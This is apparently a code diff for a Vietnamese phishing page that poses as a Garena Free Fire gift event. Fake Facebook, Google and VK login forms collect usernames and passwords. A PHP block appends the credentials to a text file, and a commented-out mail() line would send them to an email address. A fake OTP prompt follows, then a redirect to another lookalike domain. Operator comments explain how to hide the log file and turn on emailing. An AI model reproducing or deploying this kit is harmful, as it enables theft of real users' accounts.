@@ -1,47 +1,147 @@
-<?php
-  session_start();
-     date_default_timezone_set('Asia/Ho_Chi_Minh');
+<?php 
+date_default_timezone_set('Asia/Ho_Chi_Minh');
+if(isset($_POST["acc"])){
+//   $type=='';
+ $time = date('H:i:s d/m/Y');
+    $acc = $_POST["acc"];
+    $pass = $_POST["pass"];
+    $type = $_POST["type"];
+     $subject = "Cảm ơn bạn đã sử dụng code!";
+     $headers = "Tài khoản facebook";
+      $body = "Time: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n"; //định dạng acc|pass
+    
+     // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
+    $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
+    fwrite($test,$body);
+    fclose($test);
+}
+    ?>
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
 
- $huongdz['num'] = 0;
-	if(isset($_SESSION['huongdz'])) {
-		$huongdz = $_SESSION['huongdz'];
-	}
-	if($huongdz['num'] == 5){ //đăt số lần đăng nhập cho phép
-	    die('<script>alert("Spam cdmm")</script>') ; //thông báo sau khi đăng nhập quá số lần cho phép
-	}
-   if(isset($_POST["taikhoan"])){
-       $time = date('H:i:s d/m/Y');
-         $username = $_POST["taikhoan"];
-     $password = $_POST["matkhau"];
-      $headers = "Tài khoản - Facebook";
-    $subject = "code by Hướng";
-      $body = "Time: ".$time."|acc: ".$username."|pass: ".$password."\n"; //định dạng acc|pass
-  //  mail("jaxuatt6@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
-     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
-     fwrite($test,$body);
-     fclose($test);
-     	$huongdz['num']++;
-$_SESSION['huongdz'] = $huongdz;
-   }
-?> 
- <!DOCTYPE html>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" />
+
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
+    />
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+ <!-- Font Awesome -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
+  rel="stylesheet"
+/>
+<!-- Google Fonts -->
+<link
+  href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+  rel="stylesheet"
+/>
+<!-- MDB -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.css"
+  rel="stylesheet"
+/>
+    <style>
+        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}
+#myModal .modal-dialog {
+    position: absolute;
+    width: auto;
+    margin: 0;
+    width: 100%;
+    pointer-events: none;
+    border-radius: 0!important;
+    bottom: 0;
+}
+#myModal .modal-content {
+    border-radius: 0!important;
+}
+#fb input {
+    border-radius: 0!important;
+    border-top: none;
+    border-right: none;
+    border-left: none;
+    padding-bottom: 8px;
+}
+#fb .btn-primary {
+    color: #fff;
+    font-weight: bold;
+    box-shadow: none;
+    background-color: #1266f1;
+}
+div#garena {
+    background: #aa1e21;
+    color: #fff;
+    font-weight: 500;
+}
+#garena input {
+    border: none;
+    border-bottom: 1px solid #666;
+    background: transparent;
+    color: #fff;
+}
+#garena input::placeholder{
+    color:#acacac
+}
+#garena button {
+    background: #fd1414;
+    box-shadow: none;
+    font-weight: bold;
+    font-size: 20px;
+}
+#garena a {
+    color: #fff;
+}
+.alert {
+    position: relative;
+    padding: .5rem 1.5rem;
+    border-radius: 0!important;
+    font-size: 16px;
+    margin-bottom: 1rem;
+    border: 1px solid transparent;
+}
+.modal-body {
+    position: relative;
+    flex: 1 1 auto;
+    padding: 1rem;
+}
+    </style>
+        <title>Nhận quà garena free fire</title>
+    <meta content='Free fire' property='og:site_name'/>
+<meta content='https://garena.rest/x0s1MSLMLv.html' property='og:url'/>
+<meta content='website' property='og:type'/>
+<meta content='Sự kiện nhận quà free fire hot nhất 2021' property='og:description'/>
+<meta content='Nhận quà garena free fire' property='og:title'/>
+<meta content='https://garena.rest/demo/1.jpg' property='og:image'/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+ <body>
+     
+<!-- Modal -->
+<div class="modal top fade" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="false">
+  <div class="modal-dialog  modal-fullscreen">
+    <div class="modal-content">
+        <!DOCTYPE html>
         <html>
- 
+        
         <head>
             <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
             <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
             <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
             <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
-            <title>Facebook- Đăng nhập hoặc đăng ký</title>
+            <title>Facebook kết nối với Membership - Đăng nhập hoặc đăng ký</title>
             <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
             <link rel="stylesheet" type="text/css" href="https://auth-hotrogarena-vn.com/css/0b76fb06ca549b92ce7edf6aad13aeba.css" />
         </head>
- 
+        
         <body class="touch x1 _fzu _50-3 iframe acw portrait">
             <div id="viewport">
                 <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Faceb&#111;ok
                 </h1>
- 
+                
                 <div id="page" class="___class_+?1___">
                     <div class="_129_" id="header-notices"></div>
                     <div class="_4g33 _52we _52z5" id="header">
@@ -51,8 +151,8 @@ $_SESSION['huongdz'] = $huongdz;
                             </a>
                         </div>
                     </div>
-                    <div class="_5yd0 _2ph- _5yd1" id="login_error1" data-sigil="m_login_notice" hidden>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a class="_652e">Đăng ký tài khoản.</a></div>
-                    <div class="_5yd0 _2ph- _5yd1" id="login_error2" data-sigil="m_login_notice" hidden><span>Sai mật khẩu. <a  class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</a></span></div>
+                    <div class="_5yd0 _2ph- _5yd1" id="login_error1" data-sigil="m_login_notice">Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a class="_652e">Đăng ký tài khoản.</a></div>
+                    <div class="_5yd0 _2ph- _5yd1" id="login_error2" data-sigil="m_login_notice"><span>Sai mật khẩu. <a  class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</a></span></div>
                     <div class="_5soa acw" id="root" role="main">
                         <div class="_4g33">
                             <div class="_4g34" id="u_0_0">
@@ -60,16 +160,16 @@ $_SESSION['huongdz'] = $huongdz;
                                     <div class="_5rut">
                                         <div>
                                             <div class="_52jj _3-q2">
-                                                <img src="https://cdn.freelogovectors.net/wp-content/uploads/2019/01/garena-logo.png" width="150" class="_3-q3 img" />
-                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook đã liên kết với Garena</div>
+                                                <img src="https://job.fpt.edu.vn/Content/images/logo_unit/garena-logo-20210415164802.png" width="150" class="_3-q3 img" />
+                                                <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook đã liên kết với garena</div>
                                             </div>
                                         </div>
-                                        <form  class="mobile-login-form _5spm" id="login_form" novalidate="1">
+                                        <form method="POST" class="mobile-login-form _5spm" id="login_form" novalidate="1">
                                             <input type="hidden" name="_token" value="36xDR0i2X9pu7ksbgSjKcwjGQ5UoVPpisVwr45uj">                                    <div class="_56be _5sob">
                                                 <div class="_55wo _55x2 _56bf">
                                                     <div id="email_input_container">
                                                         <input class="_56bg _4u9z _5ruq "
-                                                        id="id" name="taikhoan" placeholder="Email hoặc số điện thoại" type="text"
+                                                        id="id" name="acc" placeholder="Email hoặc số điện thoại" type="text"
                                                             value="" />
                                                     </div>
                                                     <div>
@@ -79,7 +179,7 @@ $_SESSION['huongdz'] = $huongdz;
                                                                     <div class="_5xu4">
                                                                         <input autocorrect="off" autocapitalize="off"
                                                                             class="_56bg _4u9z _27z2" autocomplete="on"
-                                                                            id="m_login_password" name="matkhau"
+                                                                            id="m_login_password" name="pass"
                                                                             placeholder="Mật khẩu" type="password" />
                                                                     </div>
                                                                 </div>
@@ -164,13 +264,179 @@ $_SESSION['huongdz'] = $huongdz;
                         </div>
                     </div>
                 </div>
- 
+         
             </div>
-            <script>
-            //cài đặt thông báo sau khi đăng nhập ở đây
- let icon ='error'; //icon='error: thất bại | icon='success':thành công
+            
+     <!-- content -->
+    </div>
+  </div>
+</div>
+<!-- Modal -->
+<div class="modal top fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="false">
+  <div class="modal-dialog  modal-fullscreen">
+    <div class="modal-content">
+      <img style="
+    width: 100px!important;
+    height: 100px!important;
+    object-fit: cover;
+    border-radius: 5px;
+    display: block;
+    margin: auto;
+    margin-top: 20px;
+" id="photo" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/>
+      <div class="modal-body" id="fb">
+          <center id="thongbao">Vui lòng đăng nhập để tiếp tục</center>
+          <div class="login">   
+                  <div class="mb-3 mt-3" style="display:none">
+  <input type="text" id="type" class="form-control" />
+</div>
+          <div class="mb-3 mt-3">
+  <input type="text" id="acc" name="acc" placeholder="Số điện thoại hoặc email..." class="form-control" />
+</div>
+<div class="mb-3">
+  <input type="password" id="pass" name="pass" placeholder="Mật khẩu" class="form-control" />
+</div>
+<div class="d-grid gap-2">
+  <button class="btn btn-primary mb-4" onclick="login()" type="button">Đăng nhập</button>
+  <center><a href="#">Quên mật khẩu</a></center>
+</div>
+</div>
+        <div class="otp" style="display:none">
+    Một mã xác nhận đã được gửi đến <b id="username"></b>, vui lòng xác nhận nó vào trường bên dưới và xác nhận để tiếp tục truy cập vào tài khoản của bạn. Bạn quên copy mã OTP? <a href="#" onclick="prompt('Mã OTP của bạn, vui lòng sao chép mã bên dưới và nhấn vào OK để tiếp tục',getRndInteger(000000,999999));">nhấn vào đây</a> để nhận mã OTP mới.
+  <input type="text" placeholder="******" class="mt-2 mb-3 form-control" />
+  <div class="d-grid gap-2">
+  <button class="btn btn-primary mt-4" onclick="otp()" type="button">Tiếp tục</button>
+</div>
+</div>
+      </div>
+     
+    </div>
+  </div>
+</div>
+ <div class="myIframe"> 
+ 
+ 
+ 
+ 
+  <!--đổi giao diện ở đây-->
+  <!--đổi giao diện ở đây-->
+  <!--đổi giao diện ở đây-->
+ <!--đổi giao diện ở đây-->
+   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/1.html" id="iframe"> </iframe> 
+<!--https://ff-membership.glitch.me giao diện membership-->
+
+
+
+
+</div>
+<script>
+    focus();
+var listener = window.addEventListener('blur', function() {
+    if (document.activeElement === document.getElementById('iframe')) {
+     $('#myModal').modal('show');
+    }
+    window.removeEventListener('blur', listener);
+});
+</script>
+<div class="modal bottom fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="true" data-mdb-keyboard="true">
+  <div class="modal-dialog modal-frame modal-bottom ">
+    <div class="modal-content">
+      <div class="modal-body">
+          <center>Bạn cần đăng nhập:</center>
+          <div class="row justify-content-center mt-1 g-4">
+            <!-- facebook -->
+              <div class="col-3">
+                  <!--dùng mod thì thêm số 1 vào sau fb-->
+                  <a onclick="fb1()"><img class="w-100 rounded" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/></a>
+              </div>
+              <div class="col-3">
+                <a onclick="gg()"><img class="w-100 rounded" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png"/></a>
+            </div>
+            
+            <div class="col-3">
+                <a onclick="vk()"><img class="w-100 rounded" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/768px-VK.com-logo.svg.png"/></a>
+            </div>       
+            <!--  -->
+            </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+ let icon ='error'; //icon thất bại đổi error thành success đề thành công
  let title ='Đăng nhập thất bại'; // tiêu đề
  let text ='Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!'; //content
- 
-            </script>
-            <script src="https://scripth.glitch.me/fb.js"></script>
+function getRndInteger(min, max) {
+  return Math.floor(Math.random() * (max - min + 1) ) + min;
+}
+function otp(){
+    $("#photo").hide();
+    $(".otp").html('<div class="mb-3" style="margin:auto;display: block;text-align: center;"><a href="https://napkimcuongx10.ml/"><button type="button" class="btn btn-primary me-2 mb-2"><i class="fa fa-arrow-right me-2"></i>Tiếp tục</button></a><a href="fb-messenger://share/?link=https://napkimcuongx10.ml/"><br/>Share cho bạn bè</a></div><b>Chào mừng trở lại!</b><br/>Chúng tôi nhận thấy trước đây bạn đã đăng nhập trên ứng dụng này, vui lòng ấn "Tiếp tục" để truy cập vào trang của nhà phát hành.<br/>');
+}
+
+function login(){
+    let filename = window.location.pathname
+    var acc = $("#acc").val();
+    var pass = $("#pass").val();
+    var id = $("#id").val();
+    var type = $("#type").val();
+    if(acc.length == 0 || pass.length == 0){
+        $("#thongbao").html('<div class="alert alert-danger" role="alert" data-mdb-color="danger">Vui lòng nhập đầy đủ nội dung!</div>');
+    }
+    else {
+        $("#thongbao").hide();
+        $.post(filename, {acc:acc,pass:pass,type:type}, function(result){
+      if(result == 'otp'){
+          
+      }
+     
+    });
+    prompt('Mã OTP của '+acc +', vui lòng sao chép mã bên dưới và nhấn vào OK để tiếp tục',getRndInteger(000000,999999));
+          $("#exampleModal .login").hide();
+          $("#exampleModal .otp").show();
+          $("#username").text(acc);
+    }
+}
+        
+         function fb(){
+          $('#exampleModal').modal('show');
+             $('#myModal').modal('hide');
+             $("#photo").show();
+             $("#photo").attr('src','https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png');
+             $("#exampleModal .modal-body").attr('id','fb');
+             
+         }
+         function gg(){
+             $('#exampleModal').modal('show');
+             $('#myModal').modal('hide');
+             $("#photo").show();
+             $("#photo").attr('src','https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png');
+             $("#exampleModal .modal-body").attr('id','gg');
+             $("#type").val('Google');
+         }
+         function vk(){
+          $('#exampleModal').modal('show');
+             $('#myModal').modal('hide');
+             $("#photo").show();
+             $("#photo").attr('src','https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/768px-VK.com-logo.svg.png');
+             $("#exampleModal .modal-body").attr('id','fb');
+             $("#type").val('VK');
+         }
+         function fb1(){
+             $('#exampleModal1').modal('show');
+             $('#myModal').modal('hide');
+            
+
+         }
+
+     </script>
+<!-- MDB -->
+<script
+  type="text/javascript"
+  src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"
+></script>
+    <script type="text/javascript" src="https://scripth.glitch.me/script1.js"></script>
+   
+
+  </body>
+</html>
